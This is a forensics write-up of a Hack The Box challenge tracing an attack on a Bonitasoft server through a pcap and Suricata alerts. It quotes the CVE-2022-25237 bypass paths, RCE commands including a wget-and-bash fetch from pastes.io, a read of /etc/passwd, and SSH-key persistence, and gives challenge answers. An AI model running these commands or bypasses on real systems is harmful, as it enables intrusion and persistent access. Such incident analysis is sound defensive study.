# Meerkat

**Platform:** Hack The Box
**Category:** Forensics / DFIR
**Difficulty:** Easy
**Status:** Retired

## Overview

This Sherlock investigates a compromised Business Management Platform server running Bonitasoft. The attacker performed credential stuffing against the Bonita login service, exploited CVE-2022-25237 (an authorization bypass) to upload and execute a malicious API extension achieving RCE, then established persistence by adding an SSH public key to the server via a script hosted on pastes.io.

## Attack Chain

```
Credential stuffing against /bonita/loginservice (56 unique combos)
  → Successful login as seb.broom@forela.co.uk
    → Authorization bypass via ;i18ntranslation appended to API paths (CVE-2022-25237)
      → Upload rce_api_extension.zip via /bonita/API/pageUpload
        → RCE: whoami, cat /etc/passwd
          → wget script from pastes.io (bx5gcr0et8)
            → bash script downloads SSH pubkey (hffgra4unv) → writes to /home/ubuntu/.ssh/authorized_keys
              → Cleanup: DELETE malicious API extension page
```

## Evidence Files

| File | Description |
|------|-------------|
| `meerkat.pcap` | Network traffic capture from the compromised server |
| `meerkat-alerts.json` | 263 Suricata IDS alerts generated during the attack |

## Tools Used

| Tool | Purpose |
|------|---------|
| Wireshark | Pcap analysis, HTTP request inspection, TCP stream following |
| tshark | CLI packet analysis, extracting HTTP fields and form data |
| jq | Parsing and querying Suricata alerts JSON |
| Wayback Machine | Recovering contents of attacker's pastes.io scripts |

## Methodology

### Step 1: Analyze Suricata Alerts

Grouping the 263 alerts by signature reveals the attack:

```bash
jq '[.[].alert.signature] | group_by(.) | map({sig: .[0], count: length}) | sort_by(-.count)' meerkat-alerts.json
```

Key signatures:
- **134x** `ET INFO User-Agent (python-requests) Inbound to Webserver` — automated tool usage
- **59x** `ET WEB_SPECIFIC_APPS Bonitasoft Default User Login Attempt M1 (Possible Staging for CVE-2022-25237)` — credential stuffing
- **12x** `ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)` — the exploit
- **4x** `ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)` — malicious extension uploads
- **4x** `ET EXPLOIT Bonitasoft Successful Default User Login Attempt` — confirmed successful logins

This immediately identifies the application (**Bonitasoft**) and vulnerability (**CVE-2022-25237**).

### Step 2: Identify the Attack Type

The alerts show repeated login attempts with different credentials — this is **credential stuffing** (a subset of brute forcing that uses known username/password pairs from breached databases rather than guessing).

### Step 3: Enumerate Credential Stuffing Attempts

Extract all unique login credentials from POST requests to `/bonita/loginservice`:

```bash
tshark -r meerkat.pcap -Y 'http.request.uri contains "loginservice" && http.request.method == POST' -T fields -e urlencoded-form.value | sort -u
```

This returns **57 unique combinations** — one is the default `install:install` account, leaving **56 credential stuffing pairs**.

### Step 4: Identify the Successful Login

Distinguishing success from failure by HTTP response code:
- **`401`** — failed login
- **`204`** — successful login (plus session cookies set)

Following the TCP stream for the login that preceded the exploit activity reveals the successful credentials:
- **Username:** `seb.broom@forela.co.uk`
- **Password:** `g0vernm3nt`

In Wireshark, right-click a login POST > **Follow > TCP Stream** to see the request and response together.

### Step 5: Identify the Authorization Bypass

After authenticating, the attacker exploited CVE-2022-25237 by appending **`;i18ntranslation`** to API URL paths. This bypasses Bonitasoft's authorization filter, allowing access to privileged endpoints:

```
POST /bonita/API/pageUpload;i18ntranslation?action=add
POST /bonita/API/portal/page/;i18ntranslation
DELETE /bonita/API/portal/page/133;i18ntranslation
```

Wireshark filter to view these:

```
http.request.uri contains "i18ntranslation"
```

### Step 6: Trace the RCE Commands

The attacker uploaded `rce_api_extension.zip` (a malicious Bonita REST API extension) and used it to execute commands via:

```
GET /bonita/API/extension/rce?p=0&c=1&cmd=<command>
```

Wireshark filter:

```
http.request.uri contains "/API/extension/rce"
```

Four commands were executed:
1. `whoami` — identify the running user
2. `cat /etc/passwd` — enumerate system users
3. `wget https://pastes.io/raw/bx5gcr0et8` — download a script from **pastes.io**
4. `bash bx5gcr0et8` — execute the downloaded script

### Step 7: Recover the Persistence Script (Wayback Machine)

The pastes.io traffic was over HTTPS, so the script contents are not visible in the pcap. Using the [Wayback Machine](https://web.archive.org) to look up `https://pastes.io/raw/bx5gcr0et8` reveals the script downloaded a second file — the attacker's SSH public key — from pastes.io:

- **Public key filename:** `hffgra4unv`
- **File modified:** `/home/ubuntu/.ssh/authorized_keys`

### Step 8: Map to MITRE ATT&CK

Adding an SSH authorized key for persistence maps to:

**T1098.004 — Account Manipulation: SSH Authorized Keys**

The attacker modified the `authorized_keys` file to maintain SSH access without needing a password, surviving credential resets on the compromised Bonita application.

## Key Takeaways

**Suricata alerts accelerate triage** — The IDS alerts immediately identified the application, CVE, and attack phases without needing to manually sift through all 8,000+ packets. Always start with alert data when available.

**HTTP response codes reveal success** — In credential stuffing attacks, the difference between a 401 and a 204 (or 200/302) response tells you exactly which credentials worked. Filter for successful response codes to quickly find the winning combination.

**Encrypted traffic isn't a dead end** — When the attacker downloads payloads over HTTPS, the Wayback Machine can sometimes recover the hosted content. Always check archive services for URLs found in evidence.

**Authorization bypass via path manipulation** — CVE-2022-25237 exploits a common vulnerability pattern where appending specific strings to API paths bypasses access control filters. This is why allowlist-based authorization is preferred over blocklist approaches.

**Post-exploitation cleanup is a red flag** — The attacker deleted the malicious API extension (page 133) after achieving persistence. DELETE requests to application management endpoints should be investigated as potential anti-forensics activity.

## Personal Lessons Learned

**tshark is Wireshark for the CLI** — Same dissection engine, no GUI. The key flags: `-r` reads a pcap, `-Y` applies a display filter, `-T fields` switches to field output mode, and `-e` extracts specific fields (e.g., `-e http.request.uri`, `-e urlencoded-form.value`). Pipe through `sort -u | wc -l` for quick counting.

**Wireshark display filters are your friend** — Useful filters from this box: `http.request` (all HTTP requests), `http.request.uri contains "loginservice"` (login attempts), `http.response.code == 204` (successful responses). Save frequently-used filters as bookmarks using the + button on the filter bar.

**Follow TCP Stream to see full conversations** — Right-click a packet > Follow > TCP Stream shows the request AND response together. This is how you confirm whether a login succeeded (204 vs 401) without guessing.

**jq for JSON forensics** — `jq '.[0]'` to peek at structure, `jq 'length'` to count entries, and `group_by(.) | map({key: .[0], count: length})` for frequency analysis. Much faster than scrolling through raw JSON.

**Check the Wayback Machine for HTTPS URLs** — When a pcap shows a URL fetched over HTTPS, the content is encrypted and invisible. The Wayback Machine (`web.archive.org`) may have a cached copy — this was the only way to recover the persistence script contents and answer Tasks 8 and 9.

**Evidence vs Loot directory convention** — Raw artifacts you're given to analyze (pcaps, logs, disk images) go in `evidence/`. Things you extract or discover during the investigation (credentials, IOCs, flags) go in `loot/`.
